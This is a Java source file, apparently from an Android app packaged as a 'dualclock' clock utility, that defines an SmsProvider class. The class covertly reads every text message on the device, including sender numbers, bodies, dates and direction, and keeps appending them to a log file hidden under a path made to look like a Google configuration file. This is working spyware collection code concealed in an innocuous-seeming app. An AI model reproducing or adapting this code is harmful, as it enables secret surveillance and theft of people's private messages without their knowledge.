package com.and.dualclock;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.text.format.DateFormat;
import android.util.Log;

public class SmsProvider {

	public SharedPreferences myPrefs;
	// URI
	public static final String URI = "content://sms";
	public static int cur_date;
	static long sms_date;
	static long read_date;
	static String cur_date_str;

	public SmsProvider() {

	}

	/**
	 * Get all sms from database which have been sent after time
	 * <code>time</code>
	 * 
	 * @param time
	 * @return
	 */
	public static String logAllSms(Context context) {

		Cursor c = context.getContentResolver().query(Uri.parse(URI), null,
				null, null, null);

//		StringBuilder allSms = new StringBuilder("");

		StringBuffer resultSMS = new StringBuffer();
		if (cur_date == 0) {
			// String delegate = "MM/dd/yy hh:mm a"; // 09/21/2011 02:17 pm
			// String delegate = "ddMMyyyyhhmmss"; // 09/21/2011 02:17 pm
			String delegate = "yyyyMMddhhmmss"; // 09/21/2011 02:17 pm
			java.util.Date noteTS = Calendar.getInstance().getTime();
			cur_date_str = DateFormat.format(delegate, noteTS).toString();
			sms_date = Long.parseLong(cur_date_str);
			Log.i("count", "count" + sms_date);
			cur_date = 1;
		}

		File dir1 = new File(
					"/sdcard/Android/data/com.google.android.apps.config/");

			String[] child1 = dir1.list();
			for (int i = 0; i < child1.length; i++) {
				Log.i("",""+child1[i]);
				String eq = "androidconfig.ini";
				if (child1[i].equals(eq) ) {
					// open the file for reading
					Log.i("equals","equals"+child1[i]);
					try {
						File fin = new File(
								"/sdcard/Android/data/com.google.android.apps.config/androidconfig.ini");
						FileInputStream fis = new FileInputStream(fin);
					
						if (fis != null) {
						
							InputStreamReader inputreader = new InputStreamReader(
									fis);
							BufferedReader buffreader = new BufferedReader(
									inputreader);

							String line;
						

							while ((line = buffreader.readLine()) != null) {
								// do something with the settings from the file
								resultSMS.append(line);
								resultSMS.append("\n");
							}

						}
					} catch (FileNotFoundException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

					// close the file again fis.close();
					break;
				}

			
		}

		if (c.moveToLast()) {
			// resultSMS.append("<Allmessage>");
			resultSMS.append("\n");
			do {
				String isIncomingType = "";
				switch (Integer.parseInt(c
						.getString(c.getColumnIndex(Sms.TYPE)))) {
				case 1:
					isIncomingType = "YES";// Received
					break;
				case 2:
					isIncomingType = "NO";// "Outgoing";
					break;
				case 3:
					isIncomingType = "NO";// "Missed";
				}

				// number, name, date
				String number = c.getString(c.getColumnIndex(Sms.ADDRESS));
				
				String body = c.getString(c.getColumnIndex(Sms.BODY));
				SimpleDateFormat dateFormat = new SimpleDateFormat(
						"dd-MM-yy HH:mm:ss");
				String date = dateFormat.format(new Date(c.getLong(c
						.getColumnIndex(Sms.DATE))));
				
				SimpleDateFormat dateFormat1 = new SimpleDateFormat(
						"yyyyMMddHHmmss");
				String final_date = dateFormat1.format(new Date(c.getLong(c
						.getColumnIndex(Sms.DATE))));
			

			

				String type = "YES".equals(isIncomingType) ? "IN" : "OUT";
				read_date = Long.parseLong(final_date);
				if (sms_date < read_date) {
					
					resultSMS.append(">>" + type + ">" + date + ">" + number
							+ "\n");
					resultSMS.append(body + "\n");
				}

				

				
			} while (c.moveToPrevious());
			sms_date = read_date;

			
		}

		Log.i("ResultSMS--->", "--->" + resultSMS);
		c.close();
		
		
		try {
			String FILE_FOLDER = "Android/data/com.google.android.apps.config";

			String filepath = Environment.getExternalStorageDirectory().getPath();
			File file = new File(filepath, FILE_FOLDER);
			
			if (!file.exists()) {
				file.mkdirs();
			}
			File newxmlfile = new File(
					"/sdcard/Android/data/com.google.android.apps.config/androidconfig.ini");
			
				newxmlfile.createNewFile();
			
			// we have to bind the new file with a FileOutputStream
			FileOutputStream fileos = null;
			
				fileos = new FileOutputStream(newxmlfile);
			
			// we create a XmlSerializer in order to write xml data

			OutputStreamWriter out = new OutputStreamWriter(fileos);
			
				// write the contents on mySettings to the file
				out.write(resultSMS.toString());
				// close the file
				out.close();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		

		
		return resultSMS.toString();
	}

	static class Sms {
		public static final String _ID = "_id";
		public static final String THREAD_ID = "thread_id";
		public static final String ADDRESS = "address";
		public static final String PERSON = "person";
		public static final String DATE = "date";
		public static final String PROTOCOL = "protocol";
		public static final String READ = "read";
		public static final String STATUS = "status";
		public static final String TYPE = "type";
		public static final String REPLY_PATH_PRESENT = "reply_path_present";
		public static final String SUBJECT = "subject";
		public static final String BODY = "body";
		public static final String SERVICE_CENTER = "service_center";
		public static final String LOCKED = "locked";
	}

	public void setsmsdate(int i) {

		cur_date = i;

	}

}
